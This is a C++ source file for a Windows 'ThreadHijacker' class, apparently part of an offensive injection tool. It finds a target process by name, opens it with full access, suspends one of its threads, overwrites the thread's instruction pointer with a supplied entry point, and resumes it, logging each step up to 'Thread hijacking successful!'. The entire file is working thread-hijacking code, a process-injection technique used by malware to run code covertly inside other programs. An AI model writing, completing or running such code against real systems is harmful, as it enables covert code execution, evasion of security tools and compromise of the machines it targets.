#include "ThreadHijacker.h"
#include <iostream>
#include <tlhelp32.h>

ThreadHijacker::ThreadHijacker() 
    : m_threadHandle(NULL), m_isHijacked(false) {
    ZeroMemory(&m_originalContext, sizeof(CONTEXT));
}

ThreadHijacker::~ThreadHijacker() {
    if (m_threadHandle) {
        CloseHandle(m_threadHandle);
    }
}

DWORD ThreadHijacker::FindTargetProcess(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Failed to create process snapshot: " << GetLastError() << std::endl;
        return 0;
    }
    
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    
    DWORD processId = 0;
    
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (_stricmp(processEntry.szExeFile, processName) == 0) {
                processId = processEntry.th32ProcessID;
                std::cout << "[+] Found target process: " << processName 
                         << " (PID: " << processId << ")" << std::endl;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    
    CloseHandle(snapshot);
    
    if (processId == 0) {
        std::cerr << "[!] Target process not found: " << processName << std::endl;
    }
    
    return processId;
}

HANDLE ThreadHijacker::OpenTargetProcess(DWORD processId) {
    HANDLE processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        processId
    );
    
    if (!processHandle) {
        std::cerr << "[!] Failed to open process: " << GetLastError() << std::endl;
        return NULL;
    }
    
    std::cout << "[+] Opened target process (PID: " << processId << ")" << std::endl;
    return processHandle;
}

DWORD ThreadHijacker::FindTargetThread(DWORD processId) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Failed to create thread snapshot: " << GetLastError() << std::endl;
        return 0;
    }
    
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    
    DWORD threadId = 0;
    
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) {
                threadId = threadEntry.th32ThreadID;
                std::cout << "[+] Found target thread (TID: " << threadId << ")" << std::endl;
                break;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
    
    CloseHandle(snapshot);
    
    if (threadId == 0) {
        std::cerr << "[!] No threads found for process" << std::endl;
    }
    
    return threadId;
}

bool ThreadHijacker::HijackThread(DWORD threadId, LPVOID entryPoint) {
    // Open thread with required permissions
    m_threadHandle = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE,
        threadId
    );
    
    if (!m_threadHandle) {
        std::cerr << "[!] Failed to open thread: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Opened target thread (TID: " << threadId << ")" << std::endl;
    
    // Suspend thread
    if (!SuspendTargetThread(m_threadHandle)) {
        return false;
    }
    
    // Capture original context
    if (!CaptureThreadContext(m_threadHandle, m_originalContext)) {
        ResumeTargetThread(m_threadHandle);
        return false;
    }
    
    std::cout << "[+] Original RIP: 0x" << std::hex << m_originalContext.Rip << std::dec << std::endl;
    
    // Modify context to point to our entry point
    CONTEXT newContext = m_originalContext;
    newContext.Rip = reinterpret_cast<DWORD64>(entryPoint);
    
    if (!ModifyThreadContext(m_threadHandle, newContext)) {
        ResumeTargetThread(m_threadHandle);
        return false;
    }
    
    std::cout << "[+] Redirected RIP to: 0x" << std::hex << entryPoint << std::dec << std::endl;
    
    // Resume thread with new context
    if (!ResumeTargetThread(m_threadHandle)) {
        return false;
    }
    
    m_isHijacked = true;
    std::cout << "[+] Thread hijacking successful!" << std::endl;
    
    return true;
}

bool ThreadHijacker::SuspendTargetThread(HANDLE threadHandle) {
    DWORD suspendCount = SuspendThread(threadHandle);
    if (suspendCount == (DWORD)-1) {
        std::cerr << "[!] Failed to suspend thread: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Thread suspended (suspend count: " << suspendCount << ")" << std::endl;
    return true;
}

bool ThreadHijacker::CaptureThreadContext(HANDLE threadHandle, CONTEXT& context) {
    ZeroMemory(&context, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(threadHandle, &context)) {
        std::cerr << "[!] Failed to get thread context: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Captured thread context" << std::endl;
    return true;
}

bool ThreadHijacker::ModifyThreadContext(HANDLE threadHandle, const CONTEXT& context) {
    if (!SetThreadContext(threadHandle, &context)) {
        std::cerr << "[!] Failed to set thread context: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Modified thread context" << std::endl;
    return true;
}

bool ThreadHijacker::ResumeTargetThread(HANDLE threadHandle) {
    DWORD suspendCount = ResumeThread(threadHandle);
    if (suspendCount == (DWORD)-1) {
        std::cerr << "[!] Failed to resume thread: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Thread resumed (suspend count: " << suspendCount << ")" << std::endl;
    return true;
}
